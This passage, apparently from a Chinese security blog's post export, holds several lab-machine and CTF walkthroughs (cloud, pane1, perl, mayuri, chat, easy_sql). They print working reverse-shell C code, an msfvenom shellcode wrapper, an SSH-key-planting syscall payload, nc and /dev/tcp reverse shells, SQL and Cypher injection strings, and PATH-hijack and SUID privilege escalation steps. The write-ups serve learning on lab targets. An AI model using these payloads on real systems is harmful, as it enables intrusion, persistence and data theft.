等）。这意味着，所有依赖标准库函数（如 system() , fork() ,execve() ）的常规反弹Shell Payload均会因链接失败而无法通过编译，常规的攻击方式在此处失效。 2.绕过编译限制获取Shell法一：(fork脚本解决断连)刚测试连接的时候刚反弹shell连上但是立马就断了，所以要稳定shell才行 12345678910111213141516171819202122232425262728293031323334353637383940extern int socket(int,int,int);extern int connect(int,const void*,unsigned int);extern int dup2(int,int);extern int execve(const char*, char* const[], char* const[]);extern int fork(void);extern void _exit(int);extern int pause(void);struct sockaddr_in &#123; unsigned short sin_family; unsigned short sin_port; unsigned int sin_addr; char sin_zero[8];&#125;;int main(void) &#123; int pid = fork(); if (pid == 0) &#123; // 子进程：反弹 shell int sock = socket(2,1,0); struct sockaddr_in addr; addr.sin_family = 2; addr.sin_port = __builtin_bswap16(1234); // 改端口 addr.sin_addr = __builtin_bswap32(0xC0A83803); // 192.168.56.3 for (int i=0;i&lt;8;i++) addr.sin_zero[i]=0; connect(sock, &amp;addr, sizeof(addr)); dup2(sock,0); dup2(sock,1); dup2(sock,2); char *argv[] = &#123;&quot;/bin/sh&quot;,&quot;-i&quot;,0&#125;; char *envp[] = &#123;0&#125;; execve(&quot;/bin/sh&quot;, argv, envp); _exit(0); &#125; else &#123; // 父进程：保持挂起，不退出 while (1) pause(); &#125;&#125; 先在kali攻击机上面开启监听，然后在web80页面上传上面这个c文件即可，之后就可以拿到shell了 法二：Sublarge思路(fork解决断连)Sublarge Payload (a.sh ):1234567891011121314151617181920212223242526272829303132#!/usr/bin/env bashLHOST=&quot;192.168.56.3&quot;LPORT=&quot;1234&quot;OUT_C=&quot;test.c&quot;# 1. 生成原始 shellcodemsfvenom -p linux/x64/shell_reverse_tcp \\ LHOST=&quot;$LHOST&quot; LPORT=&quot;$LPORT&quot; \\ -f raw 2&gt;/dev/null &gt; /tmp/rev.raw[[ -s /tmp/rev.raw ]] || &#123; echo &quot;[-] msfvenom failed&quot;; exit 1; &#125;# 2. 用十六进制格式输出SC_HEX=$(xxd -p -c 1 /tmp/rev.raw | sed &#x27;s/^/0x/&#x27; | paste -sd&#x27;,&#x27; -)# 3. 写 C 文件：子进程后台执行cat &gt; &quot;$OUT_C&quot; &lt;&lt;EOFint fork(void);int execve(const char *p,char *const a[],char *const e[]);int main(void)&#123; if (fork() == 0) &#123;unsigned char sc[] = &#123;$SC_HEX&#125;;((void(*)())sc)();&#125; return 0;&#125;EOFecho &quot;[+] Generated $OUT_C (forked)&quot; 注意要给予a.sh的执行的权限，然后运行a.sh，将a.sh生成的test.c上传到服务器,最后在kali监听 法三：夜从东思路(ssh密钥对)为了成功绕过 -nostdinc 参数带来的限制，我们不能依赖C语言的库函数，而必须转向更底层的实现方式：通过内联汇编直接执行系统调用（syscall）。 攻击思路如下：构造一个特殊的C语言Payload，其核心是利用内联汇编直接调用 execve 系统调用来执行任意命令。该命令将指示目标服务器从我们的攻击机上下载预先准备好的SSH公钥，并将其写入目标用户 echo 的~&#x2F;.ssh&#x2F;authorized_keys 文件中，从而为我们建立一个持久化的SSH免密登录通道。（这里需要注意，Sublarge设置了timeout 3s，所以尽量写authorized_keys，或者使用上面两种思路） Payload ( exploit.c ):1234567891011121314151617181920212223242526272829303132333435long syscall(long num, long p1, long p2, long p3);int main() &#123; char *sh = &quot;/bin/bash&quot;; char *arg1 = &quot;bash&quot;; char *arg2 = &quot;-c&quot;; char *cmd = &quot;mkdir -p ~/.ssh &amp;&amp; busybox wget http://192.168.56.3/authorized_keys.pub -O ~/.ssh/authorized_keys &amp;&amp; chmod 700 ~/.ssh &amp;&amp; chmod 600 ~/.ssh/authorized_keys &amp;&amp; busybox wget http://192.168.56.3:80?$(whoami)&quot;; const long SYS_EXECVE = 59; char *argv[] = &#123;arg1, arg2, cmd, 0&#125;; syscall(SYS_EXECVE, (long)sh, (long)argv, 0); while(1) &#123; syscall(37, 0, 0, 0); &#125; return 0;&#125;long syscall(long num, long p1, long p2, long p3) &#123; long ret; __asm__ volatile ( &quot;movq %1, %%rax\\n&quot; &quot;movq %2, %%rdi\\n&quot; &quot;movq %3, %%rsi\\n&quot; &quot;movq %4, %%rdx\\n&quot; &quot;syscall\\n&quot; &quot;movq %%rax, %0\\n&quot; : &quot;=m&quot;(ret) : &quot;m&quot;(num), &quot;m&quot;(p1), &quot;m&quot;(p2), &quot;m&quot;(p3) : &quot;rax&quot;, &quot;rdi&quot;, &quot;rsi&quot;, &quot;rdx&quot; ); return ret;&#125; 执行步骤：1.在攻击机（ 192.168.205.128 ）上生成SSH密钥对，将本地公钥内容authorized_keys.pub上传到靶机 authorized_keys 文件，并于秘钥文件所在目录启动一个临时的HTTP服务。靶机端要求：~/.ssh 目录权限必须为 700。authorized_keys 文件权限必须为 600 123ssh-keygen -t rsa -b 4096 -f ~/.ssh/authorized_keys //生成秘钥对,可以设置密码也可以直接回车不设置密码python3 -m http.server 80 2.将上述 exploit.c 的代码粘贴到目标Web应用的输入框中，并提交执行。 3.观察攻击机上HTTP服务的日志，确认文件下载和命令执行情况。 日志清晰地显示，目标主机首先成功请求了 authorized_keys.pub 文件。随后，第三个请求的路径中包含了 echo 字符串，这是 whoami 命令执行结果的回显，从而确认了Web服务的运行用户为echo 。 3.获取初始访问权限既然SSH公钥已成功部署到目标主机 echo 用户的家中，现在我们可以使用对应的私钥直接进行SSH登录。 1ssh echo@192.168.205.145 成功登录后，通过 id 命令验证当前用户身份。 至此，我们已成功获取了用户 echo 的交互式Shell，完成了初始访问。 三、权限提升1.Sudo权限枚举在获得初始立足点后，首要任务是探查是否存在权限提升的路径。我们检查当前用户 echo 的 sudo 配置。 1sudo -l 的输出揭示了关键信息： 1.!env_reset ：这是一个非常重要的安全配置。它告知我们，当 echo 用户使用 sudo 执行命令时，系统不会重置大部分用户的环境变量，其中就包括 PATH 环境变量。这个特性是本次提权漏洞的核心。 2.(root) NOPASSWD: &#x2F;usr&#x2F;local&#x2F;bin&#x2F;system-info.sh：用户 echo 可以无需密码，以 root 权限执行 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;system-info.sh 这个脚本。 2.PATH环境变量劫持接下来，我们审计该脚本的源代码，以分析是否存在可利用的缺陷。 1234567891011121314151617181920echo@Sysadmin:~$ cat /usr/local/bin/system-info.sh#!/bin/bash#===================================# Daily System Info Report#===================================echo &quot;Starting daily system information collection at $(date)&quot;echo &quot;------------------------------------------------------&quot;echo &quot;Checking disk usage...&quot;df -hecho &quot;Checking log directory...&quot;ls -lh /var/log/find /var/log/ -type f -name &quot;*.gz&quot; -mtime +30 -exec rm &#123;&#125; \\;echo &quot;Checking critical services...&quot;systemctl is-active sshdsystemctl is-active cronecho &quot;Collecting CPU and memory information...&quot;cat /proc/cpuinfofree -mecho &quot;------------------------------------------------------&quot;echo &quot;Report complete at $(date)&quot; 代码审计发现，脚本中调用的 df , ls , find , systemctl , cat , free 等一系列命令均未使用其绝对路径（如 &#x2F;bin&#x2F;df ），而是直接使用相对路径。结合前述的 !env_reset 配置，一个经典的PATH****环境变量劫持攻击路径就此形成。当脚本以 root 权限运行时，它会依据 echo 用户自定义的 PATH 环境变量来查找这些命令。 3.提权至Root攻击步骤：1.首先，在 echo 用户的家目录下创建一个名为 df 的恶意脚本。我们的目标是利用 root 权限为&#x2F;bin&#x2F;bash 程序赋予SUID权限位，从而创建一个 “root shell后门”。 12345echo &#x27;#!/bin/bash&#x27; &gt; dfecho &#x27;chmod +s /bin/bash&#x27; &gt;&gt; dfchmod +x df 2.接着，修改 PATH 环境变量，将当前目录（ . ）添加到其最前端。这样一来，当系统查找 df 命令时，会优先在我们创建的恶意脚本所在目录中找到并执行它。 1export PATH=.:$PATH 3.万事俱备，以 root 权限执行目标脚本，触发我们的Payload。 1sudo -u root /usr/local/bin/system-info.sh 脚本在执行到 df -h 时，会调用我们伪造的 df 程序，从而以 root 权限执行了 chmod +s &#x2F;bin&#x2F;bash 。 4.验证 &#x2F;bin&#x2F;bash 的权限，确认SUID位是否已成功设置。 1ls -al /bin/bash 权限位中的 s 明确表示SUID位设置成功。 5.最后，利用这个带有SUID权限的 bash 来获取 root Shell。 -p 参数用于确保 bash 在启动时不会因为安全原因放弃由SUID获得的有效用户ID（EUID）。 1bash -p euid&#x3D;0(root) 的输出确认我们已成功提权至 root 用户。 4.获取Flag成功获得最高权限后，读取并提交所有的flag文件。 1cat /root/root.txt /home/echo/user.txt 渗透测试至此顺利完成","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"fork解决断连","slug":"fork解决断连","permalink":"http://example.com/tags/fork%E8%A7%A3%E5%86%B3%E6%96%AD%E8%BF%9E/"},{"name":"ssh秘钥生成连接","slug":"ssh秘钥生成连接","permalink":"http://example.com/tags/ssh%E7%A7%98%E9%92%A5%E7%94%9F%E6%88%90%E8%BF%9E%E6%8E%A5/"},{"name":"提权!env_reset","slug":"提权-env-reset","permalink":"http://example.com/tags/%E6%8F%90%E6%9D%83-env-reset/"}]},{"title":"群友靶机--cloud","slug":"群友靶机--cloud","date":"2025-08-14T11:05:30.132Z","updated":"2025-08-28T12:58:12.511Z","comments":true,"path":"2025/08/14/群友靶机--cloud/","permalink":"http://example.com/2025/08/14/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--cloud/","excerpt":"","text":"一、信息收集1.主机发现首先，使用 arp-scan 在 192.168.56.0&#x2F;24 网段中发现目标主机。 确认目标主机IP地址为 192.168.56.13 2.端口扫描与服务探测使用 nmap 对目标主机进行全端口扫描，识别开放的服务。 扫描发现多个开放端口。其中 9455 端口运行着一个未知的“Admin Service”，这通常是值得优先探索的突破口。使用 netcat 连接该服务进行交互 在交互式Shell中输入 help ，发现一个隐藏的命令 show-admin-pass 。 再在交互式Shell中输入 show-admin-pass ，成功获取到一个管理员密码 5jRrRnE9 。 根据端口扫描结果， 9443 端口运行着一个雷池WAF，推测该密码是WAF的登录凭证。 二、Web渗透与立足点1.绕过WAF防护访问 https://192.168.56.13:9443 ，进入雷池WAF的登录页面。 使用用户名 admin 和上一步获取的密码 5jRrRnE9 成功登录。 在WAF的管理后台中，发现其防护了一个Web应用，但该应用当前处于“维护模式”。这是导致直接访问80端口页面异常的原因。 我们将防护模式从“维护”切换为“观察”，使Web应用恢复正常访问。 2.命令注入与Getshell重新访问 http://192.168.56.13 ，跳转的是cloud.dsz打不开，所以要添加域名解析 域名解析之后页面显示为一个服务器状态检查工具。 页面中存在一个“自定义命令”的输入点，暗示可能存在命令注入漏洞。我们在此处直接构造反弹Shell的Payload，并用 nc 在Kali攻击机上进行监听。 1busybox nc 192.168.56.3 1234 -e /bin/bash Kali监听: 成功接收到反弹Shell，获得 www-data 用户权限。 三、权限提升1.横向移动(www-data -&gt; lucky)在 www-data 的Shell中进行信息收集，在 &#x2F;data&#x2F;safeline&#x2F; 目录下发现一个敏感的环境变量配置文件.env 。 该文件泄露了一个PostgreSQL数据库密码 vivrdIDj6fhNJIRdnitL 。考虑到密码复用的可能性，尝试使用此密码切换到系统中的其他用户。然后在家目录里面看到有lucky用户。 成功使用该密码切换到 lucky 用户，完成了横向移动。 2.提权至root (lucky -&gt; root)在 lucky 用户的家目录下，发现一个名为 .hint 的提示文件。 提示信息给出了 root 密码的格式：长度为4，且符合正则表达式 ‘r..o’ 。我们可以据此生成一个密码字典，然后进行爆破。 1.生成字典：1for a in &#123;a..z&#125;; do for b in &#123;a..z&#125;; do echo &quot;r$&#123;a&#125;$&#123;b&#125;o&quot;;done; done &gt; /tmp/pass 2.暴力破解–suForce：使用 su 爆破脚本（如 suForce ）和生成的字典对 root 账户进行密码猜解。 目前现在以 lucky 用户登录上靶机，所以在靶机上面下载我在kali放在服务器里面的suForce，在靶机上面爆破root用户的密码 1234567wget 192.168.56.3/suForce //如果靶机上面没有wget就换curlcurl -O http://192.168.56.3/suForce //-O 表示保存文件到当前目录，使用远程文件名（suForce）chmod +x suForce //给予suForce执行权限./suForce -u root -w pass //使用suForce爆破密码 四、获取Flag现在拥有了root权限，可以读取所有的Flag。","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"WAF","slug":"WAF","permalink":"http://example.com/tags/WAF/"},{"name":"suForce","slug":"suForce","permalink":"http://example.com/tags/suForce/"}]},{"title":"群友靶机--pane1","slug":"群友靶机--pane1","date":"2025-08-13T06:29:43.056Z","updated":"2025-08-14T06:38:47.784Z","comments":true,"path":"2025/08/13/群友靶机--pane1/","permalink":"http://example.com/2025/08/13/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--pane1/","excerpt":"","text":"一.信息收集1.主机发现确认目标主机IP地址为 192.168.56.10 2.端口扫描使用 nmap 对目标主机进行全端口扫描，识别开放的服务。 扫描结果显示开放了 22 (SSH), 80 (HTTP), 和 38415 三个端口。对38415端口的进一步扫描显示它是一个Golang的HTTP服务。 3.web目录扫描使用 gobuster 对80端口的Web服务进行目录爆破，发现几个标准PHP页面。 二、Web渗透与立足点1.后台登录爆破访问 http://192.168.56.10 是一个登录面板。 38415是1Panel ，但是显示“无法访问，当前环境已经开启了安全入口登录”，我还以为是打CVE-2025-54424，但是看了一下，这个漏洞需要https请求，确切的说是tls通信，但是我们的请求是http的，所以暂时不管。 那就简单的爆破一下80 web的密码，输入了几个常见的用户admin,root,guest,test，爆破没有结果，但是发现了一点问题，它爆破的很快，那我用户名那里就直接使用了burp的用户名列表，然后密码使用5000q.txt（rockyou前5000行） 慢： 快： 成功爆破出多组凭证： 用户名: administrator 密码: 123456，password，12345，123456789，iloveyou，princess，1234567，rockyou，12345678，abc123，nicole，charmed等等 2.信息泄露与横向移动使用上述凭证登录后台，在仪表盘页面发现关键信息。页面提示1Panel其安全访问路径： &#x2F;122b059247&#x2F; 此外，页面还提供了一个数据包文件供下载。 访问 http://192.168.56.10:38415/122b059247/ ，确认是一个1Panel的登录界面。1Panel 是一款现代化的、开源的 Linux 服务器运维管理面板，旨在帮助用户更高效地管理服务器、网站、数据库、容器等资源。它类似于 宝塔面板（BT Panel），但更注重 轻量化、安全性和云原生支持，适合开发者和运维人员使用。 尝试了几个弱密码，无果，下载抓包查看。 下载后台提供的数据包文件，并使用Wireshark进行分析。通过字符串搜索功能查找关键字，过滤 http,搜索”password”， 成功发现了三组登录凭证： root:root admin:admin root:superpassword123 使用最后一组凭证 root:superpassword123 成功登录1Panel后台。 法一：在系统文件里面直接可以查看文件，因为都是root权限，可以直接拿到user.txt和root.txt 三、权限提升法二:1.利用1Panel获取Root权限1Panel类似的运维面板，通常是root用户在跑，我本身说一步到位，直接使用终端功能的，但是它居然找我要密码，我哪来的密码给你⁉ 2.SSH密钥那我们利用SSH密钥管理功能来获取私钥吧。 进入1Panel后台，导航至 系统&gt; SSH管理 &gt;密钥认证，生成密钥，然后点击下载秘钥即可 12chmod 600 192.168.56.10_20250813162521_id_rsassh root@192.168.56.10 -i 192.168.56.10_20250813162521_id_rsa","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"1Panel","slug":"1Panel","permalink":"http://example.com/tags/1Panel/"},{"name":"密码爆破","slug":"密码爆破","permalink":"http://example.com/tags/%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4/"}]},{"title":"easy_sql","slug":"easy_sql","date":"2025-08-12T11:47:48.736Z","updated":"2025-08-12T11:51:23.858Z","comments":true,"path":"2025/08/12/easy_sql/","permalink":"http://example.com/2025/08/12/easy_sql/","excerpt":"","text":"[SWPUCTF 2021 新⽣赛]easy_sql解题⾸先查看出源代码,得到它的属性是wllm,然后再URL上输⼊下⾯的查询 123?wllm=1&#x27; order by 3 --+?wllm=1&#x27; order by 4 --+ 可以得到字段⼀共有3⾏ 然后因为确定了有⼏列,可以使⽤下⾯的语句查询 1?wllm=-1&#x27; union select 1,2,3 --+ 获取到了下⾯的结果 由此推断查询出的结果第⼆列是name,第三列是password 接下来根据回显点,输⼊下⾯的语句 1?wllm=-1&#x27; union select 1,2,database() --+ 查到了下⾯的数据库名称 根据查询到的数据库,查看下其库中有什么表 1?wllm=-1&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;test_db&#x27;--+ 查到了下⾯两张表 输⼊下⾯的语句,查询两张表中的字段 123?wllm=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;test_db&#x27;--+?wllm=-1&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;users&#x27;--+ 然后发现了我们要的flag 然后直接查询test_tb表得到我们想要的数据 1?wllm=-1&#x27; union select 1,2,flag from test_tb --+ 补充知识–和#在sql有什么区别在SQL中， – 和 # 都⽤作单⾏注释，但它们的使⽤环境和数据库系统兼容性有些不同。 1.- ：这是SQL标准的单⾏注释符号。⼤多数SQL数据库，包括SQL Server、PostgreSQL和MySQL，都⽀持使⽤ - 进⾏单⾏注释。通常， - 后⾯需要跟⼀个空格。 1SELECT * FROM table -- //这是⼀个注释 2.# ：这是MySQL特有的单⾏注释符号。它不是SQL标准的⼀部分，所以在其他数据库系统（如SQL Server或PostgreSQL）中可能不会被识别。 1SELECT * FROM table # //这也是⼀个注释，但仅在MySQL中有效 如果你的代码只需要在MySQL中运⾏，使⽤ # 是没有问题的。但如果你希望你的SQL代码能在不同的数据库系统中运⾏，最好使⽤标准的 – 注释。 总结⼀下， – 更具有通⽤性，⽽ # 是MySQL特有的。如果你在编写数据库⽆关的代码，最好使⽤ – 。 为什么要加**+**在某些SQL解析器和数据库管理系统（如MariaDB、MySQL等）中， – 后⾯需要跟⼀个空格才能被识别为SQL注释。在URL中，由于空格通常会被去掉或需要编码（通常为 %20 或 + ），所以直接使⽤⼀个空格可能会导致SQL语法错误。 在这种情况下，添加 + 实际上是在确保注释 – 后⾯有⼀个空格，这样数据库就能正确解析这个SQL注释。因此， –+ 实际上是 – （两个短划线后⾯跟⼀个空格）的URL编码形式。 这就解释了为什么在这个具体例⼦中，不加 + 会导致SQL语法错误：数据库在解析SQL时没有把 – 识别为注释，因为它后⾯没有跟空格。⽽加上 + 后，数据库就能正确地把 – 识别为注释。 union select 1,2….的返回结果是什么样的UNION SELECT 1,2,3 将会与原始查询合并，并作为⼀个新的查询结果集返回。 我们可以⽤⼀个简单的例⼦来模拟这个过程。假设我们有⼀个名为 users 的数据库表，结构如下： 1234567+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Alice | 1234 || 2 | Bob | 5678 || 3 | Carol | 9012 |+----+----------+----------+ 现在假设有⼀个原始SQL查询，⽤于获取⽤户信息： 1SELECT id, username, password FROM users WHERE id = 1; 这将返回： 12345+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Alice | 1234 |+----+----------+----------+ 现在，如果有⼈尝试进⾏SQL注⼊，他们可能会这样做： 1SELECT id, username, password FROM users WHERE id = -1&#x27; UNION SELECT 1, 2, 3-- ; 这个查询实际上会执⾏两个 SELECT 查询，并将它们的结果合并。因为 id &#x3D; -1 的查询没有结果，所以最终的输出将只包含 UNION SELECT 的结果： 12345+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | 2 | 3 |+----+----------+----------+ 如果原始查询有结果，那么 UNION SELECT 语句将把两个查询的结果合并在⼀起。 以我们之前的 users 表为例，假设原始查询是： 1SELECT id, username, password FROM users WHERE id = 1; 这将返回： 12345+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Alice | 1234 |+----+----------+----------+ 如果有⼈尝试进⾏SQL注⼊，例如： 1SELECT id, username, password FROM users WHERE id = 1&#x27; UNION SELECT 1, 2, 3-- ; 这个查询将会合并两个结果集，输出如下： 123456+----+----------+----------+| id | username | password |+----+----------+----------+| 1 | Alice | 1234 || 1 | 2 | 3 |+----+----------+----------+ group_concat 怎么⽤**,**返回结果有什么特征让我⽤⼀个具体的例⼦来解释 group_concat 和普通 SELECT 查询的区别。 假设我们有⼀个名为 test_db 的数据库，其中有三个表： users 、 orders 和 products 。 不使⽤ group_concat如果我们执⾏以下查询： 1SELECT table_name FROM information_schema.tables WHERE table_schema=&#x27;test_db&#x27;; 结果可能会是这样的多⾏数据： 12345table_name----------usersordersproducts 每个表名都会出现在结果集的⼀个单独的⾏⾥。 使⽤ group_concat现在，如果我们执⾏以下使⽤ group_concat 的查询： 1SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=&#x27;test_db&#x27;; 结果将是⼀个单⾏数据： 123group_concat(table_name)------------------------users,orders,products 所有的表名现在都被连接成了⼀个由逗号分隔的字符串，这样你就可以⼀次性地获取所有表名。","categories":[{"name":"sql注入","slug":"sql注入","permalink":"http://example.com/categories/sql%E6%B3%A8%E5%85%A5/"}],"tags":[]},{"title":"群友靶机--perl","slug":"群友靶机--perl","date":"2025-08-11T12:31:56.262Z","updated":"2025-08-13T05:43:44.044Z","comments":true,"path":"2025/08/11/群友靶机--perl/","permalink":"http://example.com/2025/08/11/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--perl/","excerpt":"","text":"一.信息收集1.主机发现与端口扫描首先在本地网络中使用 arp-scan 发现目标主机IP，随后利用 nmap 对其进行全端口扫描，以识别开放的服务。 主机发现: 端口扫描： 扫描结果表明，靶机IP为 192.168.56.8，开放了 22 (SSH) 和 80 (HTTP) 端口。 2.Web服务侦察访问80端口，发现是一个关于Perl语言的静态页面。查看页面源代码，在其中发现一条关键线索。 HTML注释中出现的 cgi 强烈暗示Web服务上可能存在CGI脚本，这通常是Web应用的一个重要攻击面。 二、漏洞发现与初始访问1.CGI目录与文件扫描根据上一步的线索，我们重点对CGI相关目录进行扫描。使用 gobuster 发现 &#x2F;cgi-bin&#x2F; 目录(这个需要针对cgi特定的字典扫描) 1gobuster dir -u http://192.168.56.8/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x cgi,pl,shtml 再用gobuster 对 &#x2F;cgi-bin&#x2F; 目录进行深度扫描，成功发现一个可疑的CGI脚本。 1gobuster dir -u http://192.168.56.8/cgi-bin/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -x cgi,pl,shtml 扫描找到了 file.cgi 文件，这是我们的主要突破口。 2.LFI到 RCE (Perl open 函数漏洞)对发现的 file.cgi 进行参数模糊测试，发现一个 file 参数存在本地文件包含 (LFI) 漏洞。 法一：可以直接读取user的flag 成功读取 &#x2F;etc&#x2F;passwd 文件。利用此漏洞读取 file.cgi 自身的源代码。(读取自身的源代码这一步很重要) 法二： 源码审计： 1curl &#x27;192.168.56.8/cgi-bin/file.cgi?file=file.cgi&#x27; 源码的核心问题在于 open(FILE, $input); 。在Perl中，这种双参数的 open 函数非常危险。当传递的参数以管道符 | 结尾时，Perl会将其后的字符串作为命令来执行。这使我们能够将LFI漏洞直接升级为远程代码执行 (RCE) 漏洞。 3.获取 www-data Shell验证RCE漏洞: 1curl &#x27;192.168.56.8/cgi-bin/file.cgi?file=|id&#x27; 成功执行 id 命令。接下来，构造反弹Shell的Payload，在本地开启监听，成功获取 www-data 用户的交互式Shell。 kali本地监听： 构造并执行Payload: 12curl &#x27;192.168.56.8/cgi-bin/file.cgi?file=|busybox+nc+192.168.56.3+1234+-e+/bin/bash&#x27;//使用busybox中的nc（netcat）工具，连接到IP地址192.168.56.3的1234端口，并将/bin/bash绑定到该连接上（即反弹一个shell）。在原始命令中，我们看到空格被替换为&#x27;+&#x27;，这是URL编码中空格的一种表示方式。 获取Shell并稳定TTY: 1script /dev/null -c bash //使用script稳定Shell 三、权限提升1.www-data -&gt; sunset在获取 www-data 权限后，对系统进行信息搜集。一般要退回到根目录查找文件，看到opt目录。 在 &#x2F;opt 目录下发现一个可疑的Perl脚本password.pl 。 该脚本属于 sunset 用户。执行此脚本，得到一个字符串。 这很可能是 sunset 用户的密码。使用 su 命令和该密码进行尝试。 成功切换到 sunset 用户。在此用户家目录下找到第一个flag。 2.sunset -&gt; root获取 sunset 权限后，立刻检查其 sudo 权限。 sunset 用户可以免密以 root 权限运行 &#x2F;usr&#x2F;bin&#x2F;guess_game.py 脚本。查看该脚本源码。 此脚本使用 python (即Python 2) 执行，并且在代码中使用了极其危险的 input() 函数。在Python 2中， input() 会将用户的输入当作Python代码来执行。因此，我们可以输入一段能够启动shell的Python代码，该代码将以 root 权限执行。 构造并执行提权Payload: 输入Payload–import(‘os’).system(‘&#x2F;bin&#x2F;bash’)后，成功获取 root 权限的shell。 获取最终Flag:","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"cgi文件","slug":"cgi文件","permalink":"http://example.com/tags/cgi%E6%96%87%E4%BB%B6/"},{"name":"LFI到RCE(open函数)","slug":"LFI到RCE-open函数","permalink":"http://example.com/tags/LFI%E5%88%B0RCE-open%E5%87%BD%E6%95%B0/"}]},{"title":"群友靶机--mayuri","slug":"群友靶机--mayuri","date":"2025-08-11T09:37:20.049Z","updated":"2025-08-28T13:01:44.069Z","comments":true,"path":"2025/08/11/群友靶机--mayuri/","permalink":"http://example.com/2025/08/11/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--mayuri/","excerpt":"","text":"一.信息收集 枚举80端口 8080 端口，有一个登录页 Cypher 注入因为没有账户名，所以先从 80 端口开始 输入数字后会返回价格等信息 1输入非数字时会提示：Error in: M?TCH (n:?h?p) whe?re n.sid = &#x27; + sid + &#x27; RET?RN n; 语法并不是SQL语法，而是Cypher Cypher 是 Neo4j 提出的图查询语言，是一种声明式的图数据库查询语言，它拥有精简的语法和强大的表现力，能够精准且高效地对图数据进行查询和更新。 文章：https://pentester.land/blog/cypher-injection-cheatsheet/#2-cypher-injection 语句是通过简单拼接，可以测试是否存在 Cypher 注入11 or 1=1 return n;// 构造语句爆标签18 RETURN 1 AS n UNION CALL db.labels() YIELD label AS n //注意n要跟题目的那个相匹配 直接爆 User18 RETURN 1 AS n UNION MATCH (n:User) 拿到一个用户凭据 To kyoma登录进去后，有一个命令执行的功能 直接反弹 shell 即可 1/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.56.3/1234 0&gt;&amp;1&#x27; 12/usr/bin/script -qc /bin/bash /dev/null //启动一个干净的 bash 会话，且不记录任何操作日志（隐蔽性较强）。stty raw -echo;fg //恢复终端 查看 &#x2F;etc&#x2F;passwd 能知道 kyoma 用户是有 bash 环境的，但是我们没有权限访问他的家目录 查找信息后，在环境变量信息中能发现 Pass 的变量 1env或者set //查看环境变量 测试后，为 kyoma 用户的密码，使用ssh连接 123用户：kyoma密码：1.129848ssh kyoma@192.168.56.108 能读取 user.txt To Root家目录下存在 Mail 文件夹 告诉我们需要通过 时间机器 来拿到权限并且TimeMachine 也是有 suid 权限的 执行一遍，会输出当前时间 拉出来分析一下 12345// kalinc -lvp 1234 &gt; TimeMachine //在 Kali 上开启监听端口 1234，任何发送到该端口的数据都会被保存到 TimeMachine 文件中（文件位于当前目录）// 靶机cat TimeMachine &gt; /dev/tcp/192.168.56.3/1234 //将靶机上的 TimeMachine 文件内容通过 TCP 发送到 IP 为 192.168.56.3（Kali）的 1234 端口 使用 IDA 打开 注意到 execute_chronos_query 很明显时间戳就是在这里输出的，并且不是绝对路径，存在路径劫持 首先创建恶意的 timedatectl 1234echo &#x27;/bin/sh&#x27; &gt; timedatectlchmod +x timedatectl //给予执行权限export PATH=.:$PATH //修改环境变量./TimeMachine //运行TimeMachine 运行完毕后即可拿到 root shell1/bin/bash -p # 获得 root shell，-p 参数：表示保持特权模式，只要/bin/bash有suid权限就可以用这个获取root shell了 读取 root.txt 拓展知识环境变量包含了许多关键的系统配置和用户设置信息。以下是常见且重要的环境变量及其作用： 核心环境变量(env查看) PATH 定义可执行程序的搜索路径 格式：/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin HOME 当前用户的主目录路径 示例：/home/kyoma USER &#x2F; LOGNAME 当前登录用户名 示例：kyoma SHELL 当前用户默认的 shell 示例：/bin/bash PWD 当前工作目录路径 示例：/home/kyoma/Documents LANG &#x2F; LC_\\* 系统语言和本地化设置 示例：en_US.UTF-8 TERM 当前终端类型 示例：xterm-256color","categories":[{"name":"群友靶机","slug":"群友靶机","permalink":"http://example.com/categories/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA/"}],"tags":[{"name":"Cypher注入","slug":"Cypher注入","permalink":"http://example.com/tags/Cypher%E6%B3%A8%E5%85%A5/"},{"name":"环境变量","slug":"环境变量","permalink":"http://example.com/tags/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F/"}]},{"title":"群友靶机--chat","slug":"群友靶机--chat","date":"2025-08-06T12:37:45.957Z","updated":"2025-08-11T12:32:35.296Z","comments":true,"path":"2025/08/06/群友靶机--chat/","permalink":"http://example.com/2025/08/06/%E7%BE%A4%E5%8F%8B%E9%9D%B6%E6%9C%BA--chat/","excerpt":"","text":"一、信息收集主机发现(ip) 端口扫描 开放了 22 (ssh-chat)、2222 (OpenSSH) 和 8000(HTTP) 三个端口。 服务发现1nmap -p22,2222,8000 -sC -sV 192.168.56.5 //查看端口具体开了什么服务 22&#x2F;tcp: 一个基于 Go 的 ssh-chat 服务。 2222&#x2F;tcp: 标准的 OpenSSH 服务，是主要的突破口。 8000&#x2F;tcp: 一个由 Golang 实现的 HTTP 文件服务器。 web服务探索访问 8000 端口，发现是一个文件目录浏览页面。通过页面内容，发现了一个 .ssh 目录，这通常存放 用户的 SSH 密钥。 在 .ssh 目录中，找到了用户的公钥 